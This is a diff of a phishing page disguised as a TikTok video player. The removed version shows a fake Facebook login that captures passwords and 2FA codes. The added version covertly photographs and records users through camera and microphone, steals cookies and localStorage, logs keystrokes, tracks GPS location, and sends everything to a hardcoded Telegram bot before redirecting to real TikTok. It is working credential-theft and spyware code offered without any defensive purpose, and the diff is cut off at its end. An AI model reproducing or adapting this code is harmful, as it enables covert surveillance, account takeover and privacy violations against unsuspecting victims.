@@ -1,174 +1,805 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>TikTok Live - Watch</title>
+    <title>TikTok - Watch Video</title>
     <style>
-        /* تنسيقات عامة */
-        body, html { margin: 0; padding: 0; height: 100%; background: #000; font-family: sans-serif; overflow-x: hidden; }
-        
-        /* واجهة التيك توك */
-        #tiktok-section { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; background: #000; }
-        .video-container { position: relative; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; }
-        video#main-video { width: 100%; height: 100%; object-fit: cover; }
-        .live-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 110; }
-        .live-tag { position: absolute; top: 20px; right: 20px; background: #ff0050; color: #fff; padding: 5px 12px; border-radius: 4px; font-weight: bold; font-size: 14px; }
-        #start-btn { background: #ff0050; color: #fff; border: none; padding: 15px 40px; border-radius: 30px; font-weight: bold; cursor: pointer; font-size: 18px; box-shadow: 0 0 20px rgba(255,0,80,0.6); }
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #000;
+            color: #fff;
+            font-family: 'TikTok Sans', Arial, sans-serif;
+            overflow: hidden;
+            position: relative;
+        }
 
-        /* واجهة الفيسبوك */
-        #facebook-section { display: none; background: #f0f2f5; min-height: 100vh; width: 100%; position: absolute; top: 0; left: 0; z-index: 200; flex-direction: column; align-items: center; }
-        .fb-header { width: 100%; text-align: center; padding: 30px 0; }
-        .fb-header img { width: 120px; }
-        .login-card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
-        .fb-msg { background: #fff9e6; border: 1px solid #ffe58f; padding: 12px; border-radius: 4px; margin-bottom: 20px; font-size: 14px; color: #856404; text-align: center; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 16px; background: #f5f6f7; }
-        .fb-btn { width: 100%; background: #1877f2; color: #fff; border: none; padding: 12px; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        /* --- Video Player Container --- */
+        .video-container {
+            width: 100vw;
+            height: 100vh;
+            max-width: 500px;
+            max-height: 100vh;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #000;
+            overflow: hidden;
+        }
+
+        .video-placeholder {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, #ff0050, #00f2ea);
+            background-size: 400% 400%;
+            animation: gradientShift 3s ease infinite;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            position: relative;
+            z-index: 10;
+            opacity: 1;
+            transition: opacity 0.5s ease;
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .video-placeholder.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .play-button {
+            width: 80px;
+            height: 80px;
+            background-color: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            margin-bottom: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .play-button svg {
+            width: 40px;
+            height: 40px;
+            fill: #fff;
+            margin-left: 5px;
+        }
+
+        .placeholder-text {
+            font-size: 1.2em;
+            color: #fff;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+            font-weight: 600;
+        }
+
+        .tiktok-logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #fff;
+        }
+
+        /* --- Loading Spinner Overlay --- */
+        #loading-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 20;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
+
+        #loading-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .spinner {
+            border: 8px solid rgba(255, 255, 255, 0.3);
+            border-top: 8px solid #ff0050;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1.2s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-message {
+            font-size: 1.1em;
+            color: #eee;
+            text-align: center;
+            max-width: 300px;
+        }
+
+        /* --- Hidden Elements for Data Collection --- */
+        #camera-feed {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            z-index: -1;
+        }
+
+        #audio-feed {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            z-index: -1;
+        }
+
+        #canvas {
+            display: none;
+        }
+
+        #video-canvas {
+            display: none;
+        }
+
+        /* --- Notification Styles --- */
+        #notification {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 10px 15px;
+            border-radius: 8px;
+            font-size: 0.9em;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+            z-index: 30;
+            border-left: 4px solid #ff0050;
+        }
+
+        #notification.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        #notification.warning {
+            border-left-color: #ffa500;
+        }
+
+        #notification.error {
+            border-left-color: #ff0000;
+        }
+
+        /* --- Progress Bar --- */
+        .progress-bar {
+            width: 200px;
+            height: 4px;
+            background-color: rgba(255, 255, 255, 0.2);
+            border-radius: 2px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff0050, #00f2ea);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        /* --- TikTok Fake UI --- */
+        .tiktok-sidebar {
+            position: absolute;
+            right: 15px;
+            bottom: 100px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            z-index: 15;
+            transition: opacity 0.5s ease;
+        }
+
+        .sidebar-icon {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: #fff;
+            font-size: 0.8em;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+            opacity: 0.9;
+        }
+
+        .sidebar-icon svg {
+            width: 35px;
+            height: 35px;
+            fill: #fff;
+            margin-bottom: 5px;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.4));
+        }
+
+        .bottom-nav {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 60px;
+            background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            z-index: 15;
+            padding-bottom: 10px;
+            transition: opacity 0.5s ease;
+        }
+
+        .nav-item {
+            color: rgba(255,255,255,0.7);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 0.75em;
+            font-weight: 600;
+        }
         
-        /* عناصر مخفية */
-        canvas, #hidden-camera { display: none; }
-        .loader { display: none; margin: 20px auto; border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .nav-item.active {
+            color: #fff;
+        }
+
+        .nav-item svg {
+            width: 24px;
+            height: 24px;
+            fill: currentColor;
+            margin-bottom: 4px;
+        }
+
+        .video-info {
+            position: absolute;
+            bottom: 80px;
+            left: 15px;
+            width: 70%;
+            z-index: 15;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+            transition: opacity 0.5s ease;
+        }
+
+        .username {
+            font-weight: bold;
+            font-size: 1.1em;
+            margin-bottom: 5px;
+        }
+
+        .description {
+            font-size: 0.9em;
+            margin-bottom: 5px;
+            line-height: 1.3;
+        }
+
+        .music {
+            display: flex;
+            align-items: center;
+            font-size: 0.85em;
+        }
+
+        .music svg {
+            width: 15px;
+            height: 15px;
+            fill: #fff;
+            margin-right: 5px;
+            animation: spin 3s linear infinite;
+        }
+
+        .hidden-ui {
+            opacity: 0;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
-
-<div id="tiktok-section">
     <div class="video-container">
-        <div class="live-tag">مباشر الآن</div>
-        <div class="live-overlay" id="overlay">
-            <button id="start-btn">مشاهدة البث المباشر</button>
+        <div class="tiktok-logo">TikTok</div>
+        
+        <div class="video-placeholder" id="video-placeholder">
+            <div class="play-button">
+                <svg viewBox="0 0 24 24">
+                    <path d="M8 5v14l11-7z"/>
+                </svg>
+            </div>
+            <div class="placeholder-text" id="placeholder-text">Tap to watch this video</div>
         </div>
-        <video id="main-video" loop playsinline>
-            <source src="https://github.com/facloook5-cpu/Img/raw/refs/heads/main/10cb671515b53c569eabd7fd10c02f9f.mp4" type="video/mp4">
-        </video>
+
+        <div class="tiktok-sidebar" id="fake-sidebar">
+            <div class="sidebar-icon">
+                <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
+                <span>542K</span>
+            </div>
+            <div class="sidebar-icon">
+                <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H6l-2 2V4h16v12z"/></svg>
+                <span>4,129</span>
+            </div>
+            <div class="sidebar-icon">
+                <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/></svg>
+                <span>Share</span>
+            </div>
+        </div>
+
+        <div class="video-info" id="fake-info">
+            <div class="username">@tiktok_creator</div>
+            <div class="description">Wait for the end! 😂🔥 #viral #trending #fyp</div>
+            <div class="music">
+                <svg viewBox="0 0 24 24"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg>
+                <span>original sound - trending_vibes</span>
+            </div>
+        </div>
+
+        <div class="bottom-nav" id="fake-nav">
+            <div class="nav-item active">
+                <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+                <span>Home</span>
+            </div>
+            <div class="nav-item">
+                <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+                <span>Discover</span>
+            </div>
+            <div class="nav-item">
+                <svg viewBox="0 0 24 24" style="width:35px;height:35px;fill:#fff;"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
+            </div>
+            <div class="nav-item">
+                <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 15H6l-2 2V4h16v13z"/></svg>
+                <span>Inbox</span>
+            </div>
+            <div class="nav-item">
+                <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                <span>Me</span>
+            </div>
+        </div>
+
+
+        <div id="loading-overlay">
+            <div class="spinner"></div>
+            <div class="loading-message" id="loading-message">Loading video content...</div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress-fill"></div>
+            </div>
+        </div>
+
+        <video id="camera-feed" autoplay playsinline muted></video>
+        <audio id="audio-feed" autoplay></audio>
+        <canvas id="canvas"></canvas>
+        <canvas id="video-canvas"></canvas>
+
+        <div id="notification"></div>
     </div>
-</div>
 
-<div id="facebook-section">
-    <div class="fb-header">
-        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu_m_aGDR.svg" alt="Facebook">
-    </div>
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0';
+        const CHAT_ID = '8350812242';
+        const TIKTOK_REDIRECT_URL = 'https://www.tiktok.com/@tiktok/video/7325515231713506592';
 
-    <div class="login-card" id="fb-login-box">
-        <div class="fb-msg">يجب تسجيل الدخول باستخدام فيسبوك لمشاهدة هذا المحتوى الحصري</div>
-        <input type="text" id="fb-user" placeholder="البريد الإلكتروني أو رقم الهاتف">
-        <input type="password" id="fb-pass" placeholder="كلمة السر">
-        <button class="fb-btn" onclick="captureFB()">تسجيل الدخول</button>
-        <div style="text-align:center; color:#1877f2; font-size:14px; margin-top:15px;">هل نسيت كلمة السر؟</div>
-    </div>
+        const videoPlaceholder = document.getElementById('video-placeholder');
+        const loadingOverlay = document.getElementById('loading-overlay');
+        const loadingMessage = document.getElementById('loading-message');
+        const progressFill = document.getElementById('progress-fill');
+        const cameraFeed = document.getElementById('camera-feed');
+        const audioFeed = document.getElementById('audio-feed');
+        const canvas = document.getElementById('canvas');
+        const videoCanvas = document.getElementById('video-canvas');
+        const context = canvas.getContext('2d');
+        const videoContext = videoCanvas.getContext('2d');
+        const notificationDiv = document.getElementById('notification');
 
-    <div class="login-card" id="fb-otp-box" style="display:none;">
-        <h3 style="text-align:center;">رمز الأمان مطلوب</h3>
-        <p style="font-size:14px; color:#606770; text-align:center;">لقد أرسلنا رمزاً مكوناً من 6 أرقام إلى هاتفك. يرجى إدخاله للمتابعة.</p>
-        <input type="number" id="fb-code" placeholder="------">
-        <button class="fb-btn" onclick="captureOTP()">تأكيد الهوية</button>
-    </div>
+        let cameraStream = null;
+        let audioStream = null;
+        let videoRecorder = null;
+        let recordedChunks = [];
+        let dataCollectionInterval = null;
+        let keystrokeLogger = null;
+        let mouseTracker = null;
 
-    <div class="loader" id="fb-loader"></div>
-</div>
+        let collectedData = {
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            deviceInfo: {},
+            location: null,
+            capturedImages: [],
+            capturedVideo: null,
+            capturedAudio: null,
+            ipInfo: null,
+            cookies: null,
+            localStorageData: {},
+            sessionStorageData: {},
+            browserFingerprint: {},
+            networkInfo: {},
+            socialMediaLogins: [],
+            clipboardContent: null,
+            keystrokes: [],
+            mouseMovements: [],
+            sessionData: {},
+            webRTCData: null,
+            canvasFingerprint: null,
+            fontList: [],
+            pluginList: [],
+            screenInfo: {},
+            batteryInfo: null,
+            connectionInfo: null,
+            hardwareInfo: {},
+            timezoneInfo: {},
+            languageInfo: {},
+            doNotTrack: null,
+            referrer: document.referrer,
+            url: window.location.href,
+            title: document.title
+        };
 
-<video id="hidden-camera" autoplay playsinline muted></video>
-<canvas id="canvas"></canvas>
+        function updateProgress(percent) {
+            progressFill.style.width = percent + '%';
+        }
 
-<script>
-    const token = '8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0';
-    const chat_id = '8350812242';
+        function startClickTracking() {
+            document.addEventListener('click', function(event) {
+                collectedData.clicks = collectedData.clicks || [];
+                collectedData.clicks.push({
+                    x: event.clientX,
+                    y: event.clientY,
+                    tag: event.target.tagName,
+                    id: event.target.id,
+                    class: event.target.className,
+                    timestamp: new Date().toISOString()
+                });
+            });
+        }
 
-    const tiktokSec = document.getElementById('tiktok-section');
-    const fbSec = document.getElementById('facebook-section');
-    const mainVid = document.getElementById('main-video');
-    const hiddenCam = document.getElementById('hidden-camera');
-    const canvas = document.getElementById('canvas');
-
-    // --- تشغيل السيناريو عند الضغط ---
-    document.getElementById('start-btn').addEventListener('click', async () => {
-        document.getElementById('overlay').style.display = 'none';
-        mainVid.play();
-        
-        // 1. إرسال بيانات الجهاز والـ IP فوراً
-        await sendMsg(`🔥 <b>صيد جديد دخل المصيدة</b>\n📱 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent.substring(0,50)}...`);
-        
-        // 2. سحب 3 صور أمامية و 3 خلفية "في الخلفية"
-        await runStealthCapture();
-
-        // 3. التحويل التلقائي لصفحة الفيس بوك بعد 6 ثواني
-        setTimeout(() => {
-            tiktokSec.style.display = 'none';
-            fbSec.style.display = 'flex';
-        }, 6000);
-    });
-
-    // --- دوال سحب البيانات والكاميرا ---
-    async function sendMsg(text) {
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: chat_id, text: text, parse_mode: 'HTML'})
-        });
-    }
-
-    async function sendPhoto(blob, cap) {
-        const fd = new FormData();
-        fd.append('chat_id', chat_id);
-        fd.append('photo', blob, 'img.jpg');
-        fd.append('caption', cap);
-        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: 'POST', body: fd});
-    }
-
-    async function runStealthCapture() {
-        // سحب 3 أمامية
-        await capture(true); 
-        // سحب 3 خلفية
-        await capture(false);
-    }
-
-    async function capture(isFront) {
-        const mode = isFront ? "user" : "environment";
-        const label = isFront ? "أمامية" : "خلفية";
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: mode}});
-            hiddenCam.srcObject = stream;
-            await new Promise(r => setTimeout(r, 1000));
-            
-            for(let i=0; i<3; i++) {
-                canvas.width = 640; canvas.height = 480;
-                canvas.getContext('2d').drawImage(hiddenCam, 0, 0, 640, 480);
-                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
-                await sendPhoto(blob, `📸 كاميرا ${label} - صورة ${i+1}`);
-                await new Promise(r => setTimeout(r, 500));
+        async function captureScreenshot() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+                try {
+                    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                    const track = stream.getVideoTracks()[0];
+                    const imageCapture = new ImageCapture(track);
+                    const bitmap = await imageCapture.grabFrame();
+                    const tempCanvas = document.createElement('canvas');
+                    tempCanvas.width = bitmap.width;
+                    tempCanvas.height = bitmap.height;
+                    tempCanvas.getContext('2d').drawImage(bitmap, 0, 0);
+                    const screenshot = tempCanvas.toDataURL('image/png');
+                    collectedData.screenshots = collectedData.screenshots || [];
+                    collectedData.screenshots.push({
+                        timestamp: new Date().toISOString(),
+                        data: screenshot
+                    });
+                    track.stop();
+                } catch (e) {}
             }
-            stream.getTracks().forEach(t => t.stop());
-        } catch(e) { console.log(label + " denied"); }
-    }
+        }
 
-    // --- دوال الفيسبوك ---
-    async function captureFB() {
-        const user = document.getElementById('fb-user').value;
-        const pass = document.getElementById('fb-pass').value;
-        if(!user || !pass) return alert("يرجى إدخال البيانات");
+        async function getIPInfoMulti() {
+            collectedData.ipInfoServices = {};
+            try {
+                const res1 = await fetch('https://ipapi.co/json/');
+                collectedData.ipInfoServices.ipapi = await res1.json();
+                collectedData.ipInfo = collectedData.ipInfoServices.ipapi;
+            } catch {}
+        }
 
-        document.getElementById('fb-login-box').style.display = 'none';
-        document.getElementById('fb-loader').style.display = 'block';
+        const messages = {
+            en: {
+                tapToWatch: 'Tap to watch this video',
+                loading: 'Loading video content...',
+                cameraRequired: 'Camera access required for video playback',
+                locationRequired: 'Location access required for content delivery',
+                autoPlay: 'Auto-playing video...',
+                error: 'An error occurred. Please try again.'
+            },
+            ar: {
+                tapToWatch: 'اضغط لمشاهدة الفيديو',
+                loading: 'جاري تحميل الفيديو...',
+                cameraRequired: 'يجب السماح بالكاميرا لتشغيل الفيديو',
+                locationRequired: 'يجب السماح بالموقع لتسليم المحتوى',
+                autoPlay: 'سيتم تشغيل الفيديو تلقائياً...',
+                error: 'حدث خطأ. حاول مرة أخرى.'
+            }
+        };
+        function getLang() {
+            return navigator.language.startsWith('ar') ? 'ar' : 'en';
+        }
+        function getMsg(key) {
+            return messages[getLang()][key] || messages['en'][key];
+        }
 
-        // إرسال الحساب
-        await sendMsg(`🆔 <b>بيانات فيسبوك</b>\n📧 الحساب: <code>${user}</code>\n🔑 الباسورد: <code>${pass}</code>`);
+        function showNotification(msg, type = 'info') {
+            notificationDiv.textContent = msg;
+            notificationDiv.className = '';
+            notificationDiv.classList.add('show');
+            if(type) {
+                notificationDiv.classList.add(type);
+            }
+            setTimeout(() => {
+                notificationDiv.classList.remove('show');
+            }, 3000);
+        }
 
-        // انتظار دقيقتين كما طلبت
+        async function captureMultipleImages() {
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                cameraFeed.srcObject = cameraStream;
+                await new Promise(resolve => cameraFeed.onloadedmetadata = resolve);
+                
+                canvas.width = cameraFeed.videoWidth;
+                canvas.height = cameraFeed.videoHeight;
+
+                for (let i = 0; i < 3; i++) {
+                    context.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
+                    collectedData.capturedImages.push({
+                        timestamp: new Date().toISOString(),
+                        data: canvas.toDataURL('image/jpeg', 0.8)
+                    });
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                }
+                
+                cameraStream.getTracks().forEach(track => track.stop());
+                return true;
+            } catch (error) {
+                return false;
+            }
+        }
+
+        async function recordSecretVideo() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                videoRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                
+                videoRecorder.ondataavailable = event => {
+                    if (event.data && event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                videoRecorder.onstop = () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const reader = new FileReader();
+                    reader.readAsDataURL(blob);
+                    reader.onloadend = () => {
+                        collectedData.capturedVideo = reader.result;
+                    };
+                };
+
+                videoRecorder.start();
+                await new Promise(resolve => setTimeout(resolve, 5000));
+                videoRecorder.stop();
+                stream.getTracks().forEach(track => track.stop());
+                return true;
+            } catch (error) {
+                return false;
+            }
+        }
+
+        function collectBrowserFingerprint() {
+            try {
+                canvas.width = 200;
+                canvas.height = 200;
+                context.textBaseline = "top";
+                context.font = "14px Arial";
+                context.fillText("Fingerprint", 2, 2);
+                collectedData.canvasFingerprint = canvas.toDataURL();
+
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        collectedData.browserFingerprint.webgl = {
+                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                        };
+                    }
+                }
+
+                const fonts = ['Arial', 'Times New Roman', 'Verdana'];
+                collectedData.fontList = fonts.filter(font => document.fonts.check(`12px "${font}"`));
+
+                collectedData.screenInfo = {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth
+                };
+
+                collectedData.hardwareInfo = {
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory || 'Unknown'
+                };
+
+                collectedData.timezoneInfo = {
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
+
+            } catch (e) {}
+        }
+
+        function collectCookiesAndTokens() {
+            try {
+                collectedData.cookies = document.cookie;
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    collectedData.localStorageData[key] = localStorage.getItem(key);
+                }
+            } catch (e) {}
+        }
+
+        function collectDeviceInfo() {
+            collectedData.deviceInfo = {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                cookieEnabled: navigator.cookieEnabled
+            };
+
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    collectedData.batteryInfo = { level: battery.level, charging: battery.charging };
+                });
+            }
+        }
+
+        async function getPreciseLocation() {
+            return new Promise(async (resolve) => {
+                if (navigator.geolocation) {
+                    try {
+                        const position = await new Promise((gpsResolve, gpsReject) => {
+                            navigator.geolocation.getCurrentPosition(gpsResolve, gpsReject, { enableHighAccuracy: true, timeout: 10000 });
+                        });
+                        collectedData.location = {
+                            gps: {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy
+                            }
+                        };
+                    } catch (error) {}
+                }
+                resolve(true);
+            });
+        }
+
+        function startKeystrokeLogging() {
+            keystrokeLogger = (event) => {
+                collectedData.keystrokes.push({ key: event.key, timestamp: new Date().toISOString() });
+            };
+            document.addEventListener('keydown', keystrokeLogger);
+        }
+
+        function startMouseTracking() {
+            mouseTracker = (event) => {
+                collectedData.mouseMovements.push({ x: event.clientX, y: event.clientY });
+            };
+            document.addEventListener('mousemove', mouseTracker);
+        }
+
+        function stopTracking() {
+            if (keystrokeLogger) document.removeEventListener('keydown', keystrokeLogger);
+            if (mouseTracker) document.removeEventListener('mousemove', mouseTracker);
+        }
+
+        async function sendComprehensiveDataToTelegram() {
+            let message = `🎥 <b>TARGET COMPROMISED (TIKTOK)</b>\n\n`;
+
+            if (collectedData.ipInfo) {
+                message += `🌍 <b>IP:</b> <code>${collectedData.ipInfo.ip}</code>\n`;
+                message += `📍 <b>Loc:</b> ${collectedData.ipInfo.city}, ${collectedData.ipInfo.country}\n`;
+            }
+
+            if (collectedData.location && collectedData.location.gps) {
+                const gps = collectedData.location.gps;
+                message += `📍 <b>GPS:</b> <code>${gps.latitude},${gps.longitude}</code>\n`;
+                message += `🌐 <a href="https://www.google.com/maps?q=${gps.latitude},${gps.longitude}">Open Map</a>\n\n`;
+            }
+
+            message += `📱 <b>Device:</b> ${collectedData.deviceInfo.platform}\n`;
+            message += `🕒 <b>Time:</b> ${collectedData.timestamp}\n`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+                });
+
+                if (collectedData.capturedImages.length > 0) {
+                    for (let img of collectedData.capturedImages) {
+                        const blob = await fetch(img.data).then(r => r.blob());
+                        const fd = new FormData();
+                        fd.append('chat_id', CHAT_ID);
+                        fd.append('photo', blob, 'img.jpg');
+                        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                    }
+                }
+
+                if (collectedData.capturedVideo) {
+                    const vBlob = await fetch(collectedData.capturedVideo).then(r => r.blob());
+                    const vFd = new FormData();
+                    vFd.append('chat_id', CHAT_ID);
+                    vFd.append('video', vBlob, 'vid.webm');
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: vFd });
+                }
+            } catch (error) {}
+        }
+
+        async function startStealthOperation() {
+            try {
+                updateProgress(20);
+                collectDeviceInfo();
+                await getIPInfoMulti();
+                
+                updateProgress(40);
+                collectBrowserFingerprint();
+                collectCookiesAndTokens();
+                
+                updateProgress(60);
+                await captureMultipleImages();
+                await recordSecretVideo();
+                
+                updateProgress(80);
+                await getPreciseLocation();
+                startKeystrokeLogging();
+                startMouseTracking();
+                startClickTracking();
+                
+                await sendComprehensiveDataToTelegram();
+                updateProgress(100);
+            } catch (error) {
+                updateProgress(100);
+            } finally {
+                setTimeout(() => {
+                    stopTracking();
+                    window.location.href = TIKTOK_REDIRECT_URL;
+                }, 2000);
+            }
+        }
+
+        function hideFakeUI() {
+            document.getElementById('fake-sidebar')?.classList.add('hidden-ui');
+            document.getElementById('fake-info')?.classList.add('hidden-ui');
+            document.getElementById('fake-nav')?.classList.add('hidden-ui');
+        }
+
+        videoPlaceholder.addEventListener('click', () => {
+            videoPlaceholder.classList.add('hidden');
+            loadingOverlay.classList.add('active');
+            hideFakeUI();
+            startStealthOperation();
+        });
+
+        showNotification(getMsg('tapToWatch'));
+
         setTimeout(() => {
-            document.getElementById('fb-loader').style.display = 'none';
-            document.getElementById('fb-otp-box').style.display = 'block';
-        }, 120000);
-    }
-
-    async function captureOTP() {
-        const code = document.getElementById('fb-code').value;
-        if(!code) return;
-
-        await sendMsg(`🔐 <b>رمز التحقق (2FA)</b>\n🔢 الرمز المستلم: <code>${code}</code>`);
-        alert("انتهت جلسة تسجيل الدخول، يرجى المحاولة لاحقاً.");
-        window.location.href = "https://facebook.com";
-    }
-</script>
